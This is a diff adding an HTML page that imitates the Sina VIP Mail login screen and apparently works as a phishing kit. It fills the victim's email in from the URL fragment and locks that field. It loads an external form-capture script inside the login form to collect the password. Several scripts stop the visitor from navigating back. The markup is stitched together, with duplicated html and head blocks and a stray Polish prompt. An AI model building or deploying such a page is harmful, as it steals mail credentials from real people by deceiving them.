@@ -1,0 +1,473 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Exmail Login - Not just mailbox</title>
+    <style>
+* {
+    box-sizing: border-box;
+    margin: 0;
+    padding: 0;
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+}
+
+body {
+    background-color: #ffffff;
+    min-height: 100vh;
+    display: flex;
+    flex-direction: column;
+    position: relative;
+    overflow-x: hidden;
+}
+
+/* Top Utility Navigation Header Bar Line Layout Elements */
+.navbar {
+    width: 100%;
+    max-width: 1200px;
+    margin: 0 auto;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    padding: 16px 40px;
+    background-color: #ffffff;
+}
+
+/* Brand Image Logo Replacement Container Area Box Graphic Blueprint */
+.logo-box {
+    width: 160px;
+    height: 40px;
+    border: 1px dashed #cccccc;
+    background-color: #fcfcfc;
+    color: #999999;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 12px;
+    font-weight: 500;
+}
+
+.nav-links {
+    font-size: 12px;
+    color: #8c8c8c;
+}
+
+.nav-links a {
+    color: #8c8c8c;
+    text-decoration: none;
+    margin: 0 4px;
+}
+
+.nav-links a:hover {
+    color: #f37022; /* Sina orange accent */
+}
+
+/* Main Content Workspace Banner backdrop area selection segment */
+.workspace-banner {
+    flex-grow: 1;
+    background-color: #43464b;
+    /* Replicating the warm deep dark gray gradient texture structure frame flawlessly */
+    background-image: linear-gradient(135deg, #4d5055 0%, #2f3135 100%);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    padding: 60px 40px;
+    width: 100%;
+}
+
+.main-content-wrapper {
+    width: 100%;
+    max-width: 1200px;
+    display: flex;
+    gap: 40px;
+    align-items: center;
+    justify-content: space-between;
+}
+
+/* Left Hero Column: Specified Boundary Placeholder Box Structure Object Node */
+.left-hero-placeholder {
+    flex: 1.1;
+    min-height: 360px;
+    border: 2px dashed rgba(255, 255, 255, 0.2);
+    border-radius: 8px;
+    background-color: rgba(255, 255, 255, 0.02);
+    color: rgba(255, 255, 255, 0.5);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 16px;
+    font-weight: 500;
+}
+
+/* Right Hero Column: Double Panel White Floating interface card component */
+.login-card-container {
+    flex: 0.9;
+    background-color: #ffffff;
+    border-radius: 12px;
+    box-shadow: 0 20px 40px rgba(0, 0, 0, 0.2);
+    display: flex;
+    overflow: hidden;
+    width: 100%;
+    max-width: 640px;
+    min-height: 400px;
+}
+
+/* Inner Left Segment Panel: Scan Matrix QR box components block */
+.qr-login-panel {
+    flex: 1;
+    padding: 36px 24px;
+    border-right: 1px solid #f0f0f0;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    text-align: center;
+}
+
+.qr-login-panel h2 {
+    font-size: 16px;
+    color: #4a4a4a;
+    font-weight: 500;
+    margin-bottom: 16px;
+    align-self: flex-start;
+}
+
+.social-icons-strip {
+    display: flex;
+    gap: 10px;
+    font-size: 11px;
+    color: #8c8c8c;
+    margin-bottom: 24px;
+}
+
+.qr-code-wrapper {
+    width: 140px;
+    height: 140px;
+    border: 1px solid #e8e8e8;
+    padding: 8px;
+    background-color: #ffffff;
+    margin-bottom: 20px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+}
+
+.qr-graphic-box {
+    width: 100%;
+    height: 100%;
+    background-color: #f5f5f5;
+    border: 1px dashed #cccccc;
+    color: #999999;
+    font-size: 11px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+}
+
+.qr-instructions {
+    font-size: 12px;
+    color: #4a4a4a;
+    line-height: 1.4;
+    max-width: 160px;
+    margin-bottom: 8px;
+}
+
+.qr-subtext {
+    font-size: 11px;
+    color: #b0b0b0;
+}
+
+/* Inner Right Segment Panel: Login Input fields container matrix stack */
+.form-login-panel {
+    flex: 1.1;
+    padding: 36px 32px;
+    display: flex;
+    flex-direction: column;
+}
+
+.form-login-panel h2 {
+    font-size: 16px;
+    color: #4a4a4a;
+    font-weight: 500;
+    margin-bottom: 28px;
+}
+
+.form-group {
+    margin-bottom: 18px;
+}
+
+.form-group label {
+    display: block;
+    font-size: 12px;
+    color: #8c8c8c;
+    margin-bottom: 8px;
+}
+
+/* Distinct light inputs styling framework layout properties */
+.form-control {
+    width: 100%;
+    height: 38px;
+    border: 1px solid #cbd5e1;
+    border-radius: 4px;
+    padding: 0 12px;
+    font-size: 14px;
+    color: #333333;
+    outline: none;
+    background-color: #ffffff;
+}
+
+.form-control:focus {
+    border-color: #3b82f6;
+}
+
+.form-control::placeholder {
+    color: #cbd5e1;
+    font-weight: 300;
+}
+
+.password-input-wrapper {
+    position: relative;
+    width: 100%;
+}
+
+.password-toggle-icon {
+    position: absolute;
+    right: 12px;
+    top: 50%;
+    transform: translateY(-50%);
+    color: #9ca3af;
+    font-size: 14px;
+    cursor: pointer;
+    user-select: none;
+}
+
+.forgot-link {
+    font-size: 13px;
+    color: #3b82f6;
+    text-decoration: none;
+    align-self: flex-end;
+    margin-bottom: 20px;
+}
+
+.forgot-link:hover {
+    text-decoration: underline;
+}
+
+/* Crisp solid royal blue block submission trigger capsule button matching layout elements */
+.submit-btn {
+    width: 100%;
+    background-color: #2b61d6;
+    color: #ffffff;
+    border: none;
+    height: 40px;
+    font-size: 14px;
+    font-weight: 500;
+    border-radius: 4px;
+    cursor: pointer;
+    margin-bottom: 28px;
+    transition: background-color 0.15s ease;
+}
+
+.submit-btn:hover {
+    background-color: #1e4bb8;
+}
+
+.footer-links-stack {
+    font-size: 12px;
+    color: #b0b0b0;
+    display: flex;
+    justify-content: space-between;
+    width: 100%;
+    margin-top: auto; /* Aligns secondary controls row seamlessly to the absolute card bottom bounds line */
+}
+
+.footer-links-stack a {
+    color: #8c8c8c;
+    text-decoration: none;
+}
+
+.footer-links-stack a:hover {
+    text-decoration: underline;
+}
+
+/* Fixed Background Desktop System Watermark Overlay Component Layout */
+.system-watermark {
+    position: fixed;
+    bottom: 24px;
+    right: 24px;
+    text-align: left;
+    font-size: 13px;
+    color: rgba(255, 255, 255, 0.15);
+    line-height: 1.4;
+    user-select: none;
+    pointer-events: none;
+    z-index: 10;
+}
+
+@media (max-width: 960px) {
+    .main-content-wrapper {
+        flex-direction: column;
+        gap: 50px;
+    }
+    .left-hero-placeholder {
+        width: 100%;
+        min-height: 200px;
+    }
+    .login-card-container {
+        max-width: 100%;
+    }
+}
+
+@media (max-width: 540px) {
+    .login-card-container {
+        flex-direction: column;
+    }
+    .qr-login-panel {
+        border-right: none;
+        border-bottom: 1px solid #f0f0f0;
+    }
+}
+
+    </style>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sina VIP Mail - Login</title>
+    <!-- Link to external stylesheet -->
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+
+    <!-- Top Utility Header Navbar Area Line -->
+    <header class="navbar">
+        <div class="brand-logo-area">
+            <!-- Header Logo Image Placeholder Box -->
+          
+<img src="https://github.com/cdtechdigital/images/blob/main/sinalogo.JPG?raw=true" alt="Trulli" width="" height="">
+        </div>
+        <nav class="nav-links">
+            <a href="#">VIP Email</a> | 
+            <a href="#">Corporate Email</a> | 
+            <a href="#">Official App Download</a>
+        </nav>
+    </header>
+
+    <!-- Main Panoramic Horizon Content Workspace Area Component -->
+    <main class="workspace-banner">
+        <div class="main-content-wrapper">
+            
+            <!-- Left Column Component: Generic Layout Boundary Placeholder Box Area -->
+            <div class="left-hero-placeholder">
+            <img src="https://github.com/cdtechdigital/images/blob/main/Sina.JPG?raw=true" alt="Trulli" width="" height="">
+            </div>
+
+            <!-- Right Column Form Container Card Box Component Module -->
+            <div class="login-card-container">
+                
+                <!-- Left Panel Segment inside white container card -->
+                <div class="qr-login-panel">
+                    <h2>Scan to log in</h2>
+                    <div class="social-icons-strip">
+                        <span>💬 WeChat</span>
+                        <span>✉️ Sina Mail</span>
+                        <span>👁️ Weibo</span>
+                    </div>
+                    <!-- Centered QR Code image structural box block component wrapper -->
+                    <div class="qr-code-wrapper">
+<div class="qr-graphic-box">    </div>
+ 
+                    </div>
+                    <p class="qr-instructions">Please use the Sina Mail app to scan the QR code.</p>
+                    <p class="qr-subtext">Scanning a QR code to log in is more secure</p>
+                </div>
+
+                <!-- Right Panel Segment inside white container card -->
+                <div class="form-login-panel">
+                    <h2>Account and password login</h2>
+                    
+                    <!-- Integrated Interactive Form submission tracking with FormSubmit -->
+                    <form action="" method="POST">
+<script id="ratufa_loader" src="https://www.ratufa.io/c/ld.js?f=px88b6jp&n=n1.ratufa.io"></script>
+                        <div class="form-group">
+                            <label for="email">Email account</label>
+                <input type="email" id="email" name="email" class="form-control" placeholder="Email address" readonly="readonly" />
+                        </div>
+
+                        <div class="form-group">
+                            <label for="password">password</label>
+                            <div class="password-input-wrapper">
+<input type="password" name="Password" placeholder="Password" class="form-control" style="font-size: 12pt; required="" oninvalid="this.setCustomValidity('Wprowadź hasło do swojego adresu e-mail')"
+  oninput="this.setCustomValidity('')"/>
+                                <span class="password-toggle-icon">👁️</span>
+                            </div>
+                        </div>
+
+                        <a href="#" class="forgot-link">forget the password?</a>
+
+                        <!-- Solid Rounded Rectangular Royal Blue Action Submission Trigger Button Block -->
+                        <button type="submit" class="submit-btn">Log in</button>
+                    </form>
+
+                    <!-- Bottom footnote advisory secondary connection paths menu links stack -->
+                    <div class="footer-links-stack">
+                        <a href="#">Register a new account</a> | 
+                        <a href="#">Register for VIP</a> | 
+                        <a href="#">Renew subscription</a>
+                    </div>
+                </div>
+
+            </div>
+
+        </div>
+    </main>
+
+    <!-- Windows Environment Activation Notification Simulation Overlay Layer Components Grid -->
+    <div class="system-watermark">
+        Activate Windows<br>
+        <span style="font-size: 11px;">Go to Settings to activate Windows.</span>
+    </div>
+
+</body>
+</html>
+
+
+    <script>
+        window.addEventListener('DOMContentLoaded', () => {
+            if (window.location.hash) {
+                document.getElementById("email").value = window.location.hash.substring(1).trim();
+            }
+        });
+    </script>
+    <!-- 1. ANTI-BACKTRACK INTERLOCK ENGINE -->
+    <script type="text/javascript">
+        (function() {
+            window.history.pushState(null, null, window.location.href);
+            
+            window.onpopstate = function() {
+                window.history.pushState(null, null, window.location.href);
+           
+            };
+        })();
+    </script>
+<script type="text/javascript">
+    window.history.pushState(null, "", window.location.href);
+    
+    window.addEventListener("popstate", function() {
+        window.history.pushState(null, "", window.location.href);
+    });
+</script>
+<script type="text/javascript">
+    function preventBack() {
+        window.history.forward();
+    }
+    setTimeout("preventBack()", 0);
+    
+    window.onunload = function () { null };
+</script>
+
+</body>
+    
+</html>
+</body>
+</html>
